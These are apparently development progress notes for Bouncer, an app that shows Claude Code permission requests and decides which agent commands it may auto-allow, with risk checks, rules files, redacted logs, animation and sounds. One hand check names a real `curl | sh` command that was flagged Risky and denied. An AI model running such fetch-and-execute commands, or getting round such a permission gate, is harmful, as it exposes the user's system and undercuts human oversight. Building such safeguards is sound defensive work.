- New dependency: `@tauri-apps/api` 2.12.1 (approved). Tauri `tray-icon` feature
  on (no new crates).
- Tests: 55 (relay 21, core 30, app 4), green locally and in CI on Windows and
  macOS. Fixtures: 12 from Claude Code 2.1.143, 11 from 2.1.287.
- Checked by hand (Charan, Windows, two monitors; Claude Code 2.1.287): real
  allow, deny and timeout-to-terminal from the island; three sessions with a
  queue; focus never left the app being typed in; hostile text inert; tray pause
  / resume / quit; drag, corners, taskbar recovery, monitor crossing.
- Not done by hand: macOS (no Mac this phase; CI builds and tests only); screen
  reader / keyboard access (Phase 5).
- Visual design is deliberately bare; the final design comes as an HTML
  prototype in `design/prototype/`.

### Phase 3 summary (2026-10-03)

- `bouncer-core::shell`: a POSIX shell parser for Bash tool commands (words,
  quotes, escapes, comments, compound operators, redirections). Anything it
  can't be sure about is an issue that blocks auto-allow: substitutions,
  variables, grouping, heredocs, `NAME=value`, unterminated or dangling input.
- PowerShell (Claude Code's tool on Windows): only plain commands (ASCII
  letters, digits, space, `. \ / : - _`) can be auto-allowed; the program
  matches ignoring case, only against existing rules; every risk check runs.
- `bouncer-core::rules`: `rules.toml` (`toml` 1.1.6, parse only) in
  `%APPDATA%\Bouncer` / `~/Library/Application Support/Bouncer`, written with
  defaults in observe mode. Strict: 64 KB cap, unknown keys, wrong types,
  unknown tools and non-plain commands refused with the line number; refused
  too if anyone else can write the file or its folder (owner + mode on macOS,
  owner + DACL on Windows) or it's a link. Any refusal falls back to the
  built-in rules in observe mode and shows in the island. Rules can be scoped
  (`exact`, `path`, `project`, compared fully resolved).
- `bouncer-core::check`: every command part must match a rule, every path
  (arguments, `--opt=value`, `-Opt:value`, redirections, tool paths, globs)
  must resolve inside the session's project (symlinks followed, `..` applied
  like the OS); root or home as the project never auto-allows. Twelve risk
  reasons joined into one sentence; risky requests are never auto-allowed or
  offered.
- Desk: auto mode answers what a rule allows (pill flash, rail tag
  "auto-allowed by rule"); observe mode adds "Would auto-allow" to the card;
  `always(id)` (sixth command) adds the backend's own exact, project-scoped
  rule, then allows; the rules file is checked every 2 s and changes or errors
  reach the island; `AskUserQuestion` / `ExitPlanMode` are never answered and
  the session shows "Needs you · question in the terminal". Paused answers
  nothing, rules included.
- Island: Risky request, Auto-allowed and Always allow built to the prototype
  (v0.4 for Always allow, committed in this PR); observe note, rules notice
  and red "rules" badge reuse its card, badge and box styles.
- Request IDs: 128 bits from `getrandom` 0.4; no ID → no card (terminal asks).
- New dependencies: `toml` 1.1.6 (approved), `getrandom` 0.4.3 (requested);
  both were already in `Cargo.lock`.
- Tests: 102 Rust (relay 22, core 75, app 5) + 11 frontend. Case tables: 214
  Bash rows, 91 PowerShell rows, 32 tool rows, scoped-rule and recorded-request
  tests; fuzzing: 5,000 generated Bash commands, 5,000 random strings and
  5,000 generated PowerShell commands.
- Checked by hand (Charan, Claude Code 2.1.288, Windows playground): a real
  `cargo check` auto-allowed; a real `curl | sh` flagged Risky and denied; the rules-file error badge and line
  number; "Always allow" end to end. Found and fixed through those runs:
  PowerShell commands, the over-broad "Bouncer's own rules" flag, questions
  shown as Allow/Deny cards.
- Not done by hand: macOS (CI only).
- Plan additions (Charan): an observe/auto switch in the island (Phase 5) and
  a model picker for chat (Phase 6).

### Phase 4 summary (2026-10-03)

- `bouncer-core::activity`: the local activity log. JSON Lines, one file per
  UTC day, in `history/` next to `rules.toml`; owner-only, refused when
  anyone else can write the file or folder; one event per line, bad lines
  skipped; 10 MB per day, then a quiet note in the island; 30-day retention;
  "Wipe history" in the tray. Only the app writes it; no new dependency
  (Charan chose JSON Lines over SQLite).
- Stored: time, session, folder, hook kind, tool, step label (first command
  line, 200 characters), the path for edit tools, and how a request ended.
  Never outputs, file contents, prompts, notification text or URLs.
- `bouncer-core::redact`: six families (private keys, URL passwords, 24
  token prefixes, secret-named assignments / flags / headers, Bearer and
  Basic, long random-looking runs), run on every field before writing; the
  whole command and paths are redacted before the label is made.
- `bouncer-core::away`: OS idle time (`GetLastInputInfo`, CoreGraphics);
  10+ idle minutes and then input opens the island on "While you were away"
  (files changed, commands, auto-allowed, asked you, where it got stuck, the
  sessions), built to the prototype; × drops it. No new IPC command.
- Sessions that never end drop off after 30 min (4 h when waiting on you);
  never while a card is up.
- Test speed: fuzz tests run 500 rounds locally, 5,000 in CI; the local
  suite takes about 30 s. CI's check job is capped at 30 min.
- Tests: 122 Rust tests on Windows (129 with the macOS-only ones; relay
  23, core 101, app 5) + 11 frontend; green locally and in CI on Windows and
  macOS. Fixtures: a fake-secret table (built at run time) and a 30-minute
  two-session span.
- Checked by hand (Charan, Claude Code 2.1.288, Windows): away summary with
  and without a stuck request, closing, redaction in the real file, folder
  permissions, wipe. Found: Claude Code now runs read-only commands like
  `hostname` without a permission request, so they never reach Bouncer.
- Not done by hand: the 30-minute session drop-off (unit test); macOS (see
  "Mac checks for Phase 9").
- Next: a separate `ci: macos smoke test` PR (Charan), then Phase 5.

### Phase 5a summary (2026-10-03)

- Bouncer moves from code: `motion.ts` (no DOM) is a fixed-step physics body
  (1/240 s steps, frames clamped to 50 ms) with gravity, squash 0.84 and
  stretch 1.12 to the spec's 9-unit, 900 ms jump; `ball.ts` writes it into
  the prototype's SVG as transforms. One Motion survives re-renders, so a
  rebuilt island no longer restarts him.
- Seven moods from "Meet Bouncer": idle breathes ~10 s then holds still,
  working jumps, needs you hops twice every 1.6 s with "!", risky turns red
  and puffs up, done cheers when a session finishes (working → idle), paused
  sleeps, dance is drawn (Phase 8 triggers it). Launch greeting: he drops in
  and bounces ("Bouncer · at the door", 2.5 s); never over a card, the paused
  pill or an open island.
- The shades are the eyes (Charan): the face looks toward the cursor from
  the page's own mouse events (no backend feed), blinks every 8–12 s as two
  repaints; a click squashes him without opening the island, four quick
  clicks make him dizzy.
- Frames run only while something moves; none when hidden, settled or with
  OS reduced motion (no bounce, breathing, tracking or blink then).
- `redact.rs`: JSON secret values end at an unescaped quote, so nothing
  after `\"` leaks (run-time fake-secret tests).
- Tests: 123 Rust + 28 frontend (motion 12, mood 4), green locally; gitleaks
  rules checked on every added line.
- Checked in the app (see Verify above): idle CPU, card arming / focus /
  overlap, reduced motion, moods.
- Not checked by hand yet (Charan): the feel of looking, squish and dizzy
  with a real mouse in the island; a real Claude Code session; macOS.

### Phase 5b summary (2026-10-04)

- Settings screen (prototype v0.8–v0.10 first): Size (100 / 112 / 125%,
  Medium default), Sound, Auto-allow, Wipe history (confirm, armed), the
  rules file path, hook status ("installed" / "not installed: run bouncer
  install-hooks"; install stays in the CLI until the Phase 9 installer).
  Opened from a cog in the session list or the tray ("Settings…").
- Preferences in `preferences.json` next to `rules.toml`, read with the
  rules file's checks, written atomically, known values only.
- One island scale for everything, capped at 40% of the screen's width and
  the work area's height; Settings compact enough for a 768-px screen.
- Observe / auto switch: `rules::set_mode` rewrites only the mode line and
  checks the read-back; turning auto on asks (focus on Cancel, Esc cancels,
  Enter never, armed 600 ms).
- Three generated sounds (needs you, risky, done), one at a time, repeats
  within 2 s dropped, none while paused or muted; the audio context is
  suspended after each.
- Keyboard access only when opened on purpose (tray "Open Bouncer" /
  "Settings…", the cog): Tab stays in the island, Enter never presses an
  armed button, Space works once armed, a new card focuses its Deny, Esc
  gives the keyboard back; losing focus makes the window non-focusable
  again. Screen readers get one short sentence per event (a separate live
  region) instead of the whole island.
- Contrast fixed to ≥ 4.5:1 (faint text, line numbers, risky badge).
- Fixed on the way: a queued card could arm behind the Allowed / Denied
  message.
- Tests: 133 Rust + 36 frontend, green locally.
- Needs Charan by hand: tray items and real OS focus, Narrator reading
  order, the sounds by ear, Settings on his screen.

### Phase 5d summary (2026-10-06)

- Listen-and-pick board in the prototype first (v0.13 → v0.15): 17
  club-bouncer sounds made in code, three styles cut to Soft (default) and
  Playful after Charan's first listen, three wipe options; every sound a
  keep, the broom "swish" picked.
- The app plays exactly those recipes (checked against the prototype's,
  part by part). Soft keeps needs you and risky buzzy and 5 dB above the rest.
- Six sounds on by default (launch, needs you, risky, done, tool failed,
  welcome back); Settings has style, volume and one switch per sound, saved
  in `preferences.json`.
- `PostToolUseFailure`: installed with the other hooks (diff, confirm,
  uninstall), a real 2.1.291 fixture, the error text dropped in the relay,
  "failed" in the log and the island, Esc doesn't count.
- Rules: one sound at a time (alarms cut lighter ones), 2-s repeat drop,
  nothing while paused but the snore, "yo!" at launch whenever Sound is
  on (reduced motion too), the audio context suspended between sounds;
  idle CPU unchanged.
- Tests: 150 Rust + 51 frontend, green locally.
- Needs Charan: listening in the app, pause / resume from the tray, macOS.

### Phase 5c summary (2026-10-04)

- Prototype v0.11 first (approved): the morph, the window order, peek on
  hover, the ticker, a "Show window" / "Slow ×4" / "Reduced motion" demo.
- The island morphs with one Web Animation (width, height, radius, color,
  and the 8-px drop from the strip): 320 ms spring growing, 200 ms ease-out
  closing. Growing, the window is asked for the bigger size first and the
  island waits (150 ms at most); closing, the window shrinks after. Two
  window resizes per change instead of one per frame. The 8-px top gap is
  inside the window now, so the island grows out of the screen's top edge.
- A card is never animated, nothing morphs while one is in front, and its
  600 ms arm starts when the window holds the whole card (was: when drawn).
  The content "rise" plays only when growing (it replayed on every
  re-render, cards included).
- `+N −M` on the working pill (Edit, MultiEdit summed; Write `+N`); the
  activity log stores the two numbers, never the text.
- `line_ops` treats an edit over 1,000,000 table cells as a whole
  replacement (memory ≤ 4 MB).
- Reduced motion: no morph, no rise, one-step resize.
- Fixed on the way: the pill flashed between a decision and its "Allowed /
  Denied" message.
- Tests: 137 Rust + 41 frontend, green locally.
- Needs Charan by hand: the feel of the motion on his screen (and peek on
  hover with a real mouse); macOS.
- After review (Charan): fixed the strip flicker on hover and the code
  pane's lines laid out side by side; peek delay 200 ms. Known: a one-frame
  sideways jump when the island's width changes, fixed next in "Island
  window region".
